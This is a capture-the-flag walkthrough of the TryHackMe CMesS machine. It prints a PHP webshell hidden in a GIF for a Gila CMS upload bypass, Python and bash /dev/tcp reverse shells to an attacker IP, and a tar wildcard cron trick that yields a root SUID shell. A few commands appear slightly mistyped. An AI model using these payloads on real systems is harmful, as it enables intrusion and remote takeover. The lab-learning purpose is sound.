@@ -1,0 +1,166 @@
+---
+tags: gilacms, cron, wildcard cronjob
+---
+# THM: CMesS
+
+***Overview**: CMesS is a medium rated tryhackme machine. This machine exploits a Remote Command Execution (RCE) vulnerability in Gila CMS 1.10.9 which manipulates the media upload functionality to gain foothold into the machine and then it also exploits a wildcard cronjob running as root to escalate privilege to root. Please enjoy!!*
+
+## Scanning and Enumeration
+- we first start our reconnaissance by my running my nmap scan on the machine after adding the vhost to the /etc/hosts file
+```shell
+┌──(kali㉿kali)-[~]
+└─$ echo "10.10.105.80 cmess.thm" | sudo tee -a /etc/hosts
+[sudo] password for kali: 
+10.10.105.80 cmess.thm
+                                                                                                                                                                       
+┌──(kali㉿kali)-[~]
+└─$ nmap -sV -sC -A 10.10.105.80                          
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-21 05:04 EDT
+Nmap scan report for cmess.thm (10.10.105.80)
+Host is up (0.17s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d9b652d3939a3850b4233bfd210c051f (RSA)
+|   256 21c36e318b85228a6d72868fae64662b (ECDSA)
+|_  256 5bb9757805d7ec43309617ffc6a86ced (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+|_http-generator: Gila CMS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+| http-robots.txt: 3 disallowed entries 
+|_/src/ /themes/ /lib/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 42.62 seconds
+```
+`ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://cmess.thm/FUZZ -e .php,.txt`
+
+![](assets/CMesS_assets/Pasted%20image%2020230521150144.png)
+- from our nmap scan, we can see that our robots.txt file is available to view
+![](assets/CMesS_assets/Pasted%20image%2020230521100856.png)
+- but going to all the directories specified in the robots.txt file, we can see that it keeps redirecting us to a forbidden directory
+for all of the directories above
+![](assets/CMesS_assets/Pasted%20image%2020230521101428.png)
+![](assets/CMesS_assets/Pasted%20image%2020230521141829.png)
+- we then scan for subdomains using ffuf, and we discover the subdomain dev
+`ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.cmess.thm" -u http://cmess.thm -fw 522`
+![](assets/CMesS_assets/Pasted%20image%2020230521112356.png)
+- we can then add this subdomain to the /etc/hosts file and then verify its existence by curling to that subdomain
+```shell
+┌──(kali㉿kali)-[~]
+└─$ echo "10.10.168.183 dev.cmess.thm" | sudo tee -a /etc/hosts
+[sudo] password for kali: 
+10.10.168.183 dev.cmess.thm
+                                                                                                                                                                       
+┌──(kali㉿kali)-[~]
+└─$ curl -I dev.cmess.thm                                      
+HTTP/1.1 200 OK
+Date: Sun, 21 May 2023 10:22:53 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Last-Modified: Thu, 06 Feb 2020 22:22:59 GMT
+ETag: "3a6-59defb725b6c0"
+Accept-Ranges: bytes
+Content-Length: 934
+Vary: Accept-Encoding
+Content-Type: text/html
+```
+- going to the subdomain, we can see a conversation between a user andre and the support, from this conversation, we areable to obtain credentials such as email and password
+![](assets/CMesS_assets/Pasted%20image%2020230521112536.png)
+- we attempt to login at /admin using andre@cmess.thm as email and KPFTN_f2yxe% as password and we gain access
+
+![](assets/CMesS_assets/Pasted%20image%2020230521113013.png)
+## Exploitation
+
+- we can see the version of the Gila CMS running
+![](assets/CMesS_assets/Pasted%20image%2020230521113200.png)
+- so now we can search for exploits for this CMS and we found one at [https://rastating.github.io/gila-cms-upload-filter-bypass-and-rce/](https://rastating.github.io/gila-cms-upload-filter-bypass-and-rce/)
+- Following the steps in the exploit, we create a file test.gif with the contents and upload it in the media 
+```
+GIF89a; <?=`$_GET[1]`?>
+```
+![](assets/CMesS_assets/Pasted%20image%2020230521115407.png)
+```ad-note
+I attempted uploading a php reverse shell file but the file format wasn't acceptable
+```
+- we can view the image in the media to know the directory our .gif file will be located and we can see below it is stored at `/tmp/media_thumb`
+![](assets/CMesS_assets/Pasted%20image%2020230521115902.png)
+- we then move the saved test.gif file to the file `tmp/media_thumb/shell.php`
+![](assets/CMesS_assets/Pasted%20image%2020230521114718.png)
+- we then create another file test2.gif with the content `# GIF89a;` and then move the file to the file  `/tmp/.htaccess`
+![](assets/CMesS_assets/Pasted%20image%2020230521115152.png)
+- then we try to view /etc/passwd file to test http://cmess.thm/tmp/media_thumb/shell.php?1=cat+/etc/passwd and worked, we have Remote Code Execution (RCE)!!!!
+![](assets/CMesS_assets/Pasted%20image%2020230521115711.png)
+- we can run the `whoami` command
+![](assets/CMesS_assets/Pasted%20image%2020230521120101.png)
+
+## Foothold
+- we can also see if python3 is running so we can attempt a reverse shell, and it is
+![](assets/CMesS_assets/Pasted%20image%2020230521120213.png)
+- now we run the following command with our netcat listening
+```python
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.80.123",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
+```
+- and we get a shell
+![](assets/CMesS_assets/Pasted%20image%2020230521121926.png)
+
+## Further Enumeration and Privilege Escalation
+
+- we run the `history`, `sudo -l` and other commands to see if we can find escalation vectors, then when we view our crontabs, we notice something interesting, a cronjob running with a wild card but to be able to exploit this, we have to gain foothold as andre, so we keep looking
+![](assets/CMesS_assets/Pasted%20image%2020230521122712.png)
+- we can view the open ports running on the machine to check for ports running locally and we can see that we have port 3306 running, which gives us a hint that  mysql is running
+![](assets/CMesS_assets/Pasted%20image%2020230521131248.png)
+- looking through files we can see the config.php file and we get some credentials which seem like it belongs to a mysql account running locally, the username is root, the password is r0otus3rpassw0rd, and the database name is gila
+
+![](assets/CMesS_assets/Pasted%20image%2020230521131133.png)
+- so we sign in to the mysql database and look through for maybe credentials
+![](assets/CMesS_assets/Pasted%20image%2020230521131441.png)
+- we find a hash for andre but after analysis, we discover it is a blowfish hash and might belongs to the password we found in the dev subdomain which we found earlier, so we move on
+![](assets/CMesS_assets/Pasted%20image%2020230521141234.png)
+- we run our linpeas.sh script and then we notice a hidden file .password.bak in the /opt directory
+![](assets/CMesS_assets/Pasted%20image%2020230521135627.png)
+- viewing it we discover andre's backup password as UQfsdCB7aAP6, JACKPOT!!
+![](assets/CMesS_assets/Pasted%20image%2020230521135718.png)
+- so since we know ssh is open on the system, we try logging in with the credentials found and BOOM, we get access
+![](assets/CMesS_assets/Pasted%20image%2020230521135903.png)
+- so now we can finally exploit the cronjob using a wildcard, now our cronjob runs after every 2 minutes
+- what the cronjob command does is to change directory to the backup directory and then archive all its files in a gzip archive in the tmp directory
+![](assets/CMesS_assets/Pasted%20image%2020230521135929.png)
+- we can view the contents of the file in the backup directory know as note
+![](assets/CMesS_assets/Pasted%20image%2020230521162642.png)
+- so now that we understand what is happening,  we will run the following commands consecutively
+```shell
+andre@cmess:~$ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/andre/backup/runme.sh
+andre@cmess:~$ chmod +x runme.sh 
+andre@cmess:~$ touch /home/andre/backup--checkpoint=1
+andre@cmess:~$ touch /home/andre/backup--checkpoint-action=exec=sh\ runme.sh
+```
+- the first command just saves the command in a file runme.sh, what the command does is to copy the bash file to tmp folder and then add suid permission to that bash file, so we can just run `/tmp/bash -p` and get a shell
+- then we run the rest of the commands which exploit the `tar` command
+- after executing the commands, we wait a while for the cronjob to run and when we view the /tmp folder, we can see the bash file
+![](assets/CMesS_assets/Pasted%20image%2020230521152449.png)
+- so now we can run the `/tmp/bash -p` command and get a shell as root
+![](assets/CMesS_assets/Pasted%20image%2020230521152537.png)
+- we finally get our root.txt file
+![](assets/CMesS_assets/Pasted%20image%2020230521153520.png)
+
+OR
+- Another way we can do this by getting a reverse shell as root on a listening port, so we can run the following commands in the backup directory, because it is being backed up using the tar command
+```shell
+andre@cmess:~/backup$ echo "bash -i >& /dev/tcp/10.8.80.123/4040 0>&1" > test.sh
+andre@cmess:~/backup$ cat runme.sh 
+bash -i >& /dev/tcp/10.8.80.123/4040 0>&1
+andre@cmess:~/backup$ chmod +x test.sh
+andre@cmess:~/backup$ echo "" > "--checkpoint-action=exec=bash test.sh"
+andre@cmess:~/backup$ echo "" > --checkpoint=1
+```
+- and on our listening port we can see we have access as root
+![](assets/CMesS_assets/Pasted%20image%2020230521155102.png)
+- and we get our root file
+![](assets/CMesS_assets/Pasted%20image%2020230521155147.png)
+
+
+Thank you reading, hope you enjoyed it
+See you next time!!
